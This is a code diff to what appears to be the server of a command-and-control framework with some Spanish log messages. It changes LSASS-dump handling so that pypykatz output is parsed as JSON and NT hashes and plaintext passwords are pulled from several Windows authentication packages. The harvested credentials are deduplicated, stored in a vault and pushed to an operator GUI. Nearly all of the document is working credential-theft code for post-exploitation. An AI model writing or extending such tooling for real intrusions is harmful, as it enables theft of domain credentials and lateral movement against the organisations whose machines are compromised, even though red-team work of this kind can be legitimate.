@@ -469,8 +469,98 @@ func (s *Server) CheckAndPromptLSASS(agentID, filename string, taskID int64) {
 	go s.parseLSASSDump(agentID, taskID, dumpPath, filename)
 }
 
+// pypykatz JSON structures (output of: pypykatz lsa minidump --json <file>)
+type pyMsvCred struct {
+	Username string  `json:"username"`
+	Domain   string  `json:"domainname"`
+	NTHash   *string `json:"NThash"`
+	LMHash   *string `json:"LMHash"`
+}
+type pyPassCred struct {
+	Username string  `json:"username"`
+	Domain   string  `json:"domainname"`
+	Password *string `json:"password"`
+}
+type pySession struct {
+	MsvCreds      []pyMsvCred  `json:"msv_creds"`
+	WdigestCreds  []pyPassCred `json:"wdigest_creds"`
+	KerberosCreds []pyPassCred `json:"kerberos_creds"`
+	TspkgCreds    []pyPassCred `json:"tspkg_creds"`
+	CredmanCreds  []pyPassCred `json:"credman_creds"`
+	SspCreds      []pyPassCred `json:"ssp_creds"`
+}
+type pyFile struct {
+	LogonSessions map[string]pySession `json:"logon_sessions"`
+}
+
+func parsePypykatzJSON(data []byte) []parsedCred {
+	// pypykatz --json wraps output as {"filepath": {"logon_sessions": {...}}}
+	// Try the nested-by-filename format first, then the direct format.
+	var byFile map[string]pyFile
+	if err := json.Unmarshal(data, &byFile); err != nil {
+		return nil
+	}
+
+	seen := map[string]bool{}
+	var creds []parsedCred
+	add := func(c parsedCred) {
+		c.secret = strings.ToLower(strings.TrimSpace(c.secret))
+		if c.username == "" || c.secret == "" {
+			return
+		}
+		low := c.secret
+		if low == blankNT || low == blankLM {
+			return
+		}
+		k := credKey(c)
+		if seen[k] {
+			return
+		}
+		seen[k] = true
+		creds = append(creds, c)
+	}
+
+	for _, f := range byFile {
+		for _, sess := range f.LogonSessions {
+			for _, msv := range sess.MsvCreds {
+				if msv.NTHash != nil && *msv.NTHash != "" {
+					add(parsedCred{credType: "ntlm", domain: msv.Domain, username: msv.Username, secret: *msv.NTHash})
+				}
+			}
+			for _, p := range sess.WdigestCreds {
+				if p.Password != nil && *p.Password != "" {
+					add(parsedCred{credType: "plaintext", domain: p.Domain, username: p.Username, secret: *p.Password})
+				}
+			}
+			for _, p := range sess.KerberosCreds {
+				if p.Password != nil && *p.Password != "" {
+					add(parsedCred{credType: "plaintext", domain: p.Domain, username: p.Username, secret: *p.Password})
+				}
+			}
+			for _, p := range sess.TspkgCreds {
+				if p.Password != nil && *p.Password != "" {
+					add(parsedCred{credType: "plaintext", domain: p.Domain, username: p.Username, secret: *p.Password})
+				}
+			}
+			for _, p := range sess.CredmanCreds {
+				if p.Password != nil && *p.Password != "" {
+					add(parsedCred{credType: "plaintext", domain: p.Domain, username: p.Username, secret: *p.Password})
+				}
+			}
+			for _, p := range sess.SspCreds {
+				if p.Password != nil && *p.Password != "" {
+					add(parsedCred{credType: "plaintext", domain: p.Domain, username: p.Username, secret: *p.Password})
+				}
+			}
+		}
+	}
+	return creds
+}
+
 func (s *Server) parseLSASSDump(agentID string, taskID int64, dumpPath, filename string) {
-	out, err := exec.Command("pypykatz", "lsa", "minidump", dumpPath).CombinedOutput()
+	// Use --json for structured output; stdout only so log lines don't corrupt the JSON.
+	cmd := exec.Command("pypykatz", "lsa", "minidump", "--json", dumpPath)
+	jsonOut, err := cmd.Output()
 	if err != nil {
 		s.printf("[LSASS] pypykatz no disponible — descarga manual: %s\n", filename)
 		BroadcastGUI("LSASS_DUMP_PROMPT", agentID, fmt.Sprintf(
@@ -479,8 +569,12 @@ func (s *Server) parseLSASSDump(agentID string, taskID int64, dumpPath, filename
 		return
 	}
 
-	pyOut := string(out)
-	creds := ParseCreds(pyOut)
+	// Find first '{' in case pypykatz prepends any text to stdout.
+	if idx := bytes.IndexByte(jsonOut, '{'); idx > 0 {
+		jsonOut = jsonOut[idx:]
+	}
+
+	creds := parsePypykatzJSON(jsonOut)
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("[+] LSASS parsed — %d credential(s)\n\n", len(creds)))
@@ -497,8 +591,6 @@ func (s *Server) parseLSASSDump(agentID string, taskID int64, dumpPath, filename
 	parsed := sb.String()
 	s.printf("[LSASS] %d credenciales de %s\n", len(creds), filename)
 
-	// InsertResult handles INSERT vs UPDATE automatically and triggers
-	// autoParseCredentials which imports the hashes to the credential vault.
 	if taskID > 0 {
 		_ = s.db.InsertResult(taskID, agentID, parsed, "")
 		BroadcastGUI("CREDS_UPDATED", agentID, fmt.Sprintf("%d creds from %s", len(creds), filename))
